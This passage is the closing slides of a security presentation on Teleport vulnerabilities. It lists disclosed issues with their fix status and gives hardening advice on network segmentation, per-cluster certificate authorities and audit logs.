First a big thanks to Teleport. Disclosed issues, and immediately they got to work triaging and prioritizing.

- Node System Role Recording Access - Fixed in 18.7.4 and 17.7.26

- • Node/App/DB System Role Permissions - Upcoming fix for Blackhat

- SSH Agent Forwarding - No fix for now

- IronRDP Smartcard PIN Bypass - 18.9.0 and 17.7.25

68

Information Classification: General

## Slide 89

# Hardening

Best practices for segmentation and restricting access to ports still matters: • Can’t pull off the Database certificate attack if we can’t access the Database port • Can’t pull off the RDP golden certificate attack if we can’t access RDP port

CA certificates are per-cluster, review if your QA database need to be in the same cluster as production

Audit logs are your friend

X

Information Classification: General

## Slide 90

# Thanks & Any Questions?

### All of the tools shown in this presentation will be available on GitHub

<u>https://github.com/xpn/TAK</u>

@_xpn_

/in/xpn

<u>https://blog.xpnsec.com</u>

69

Information Classification: General
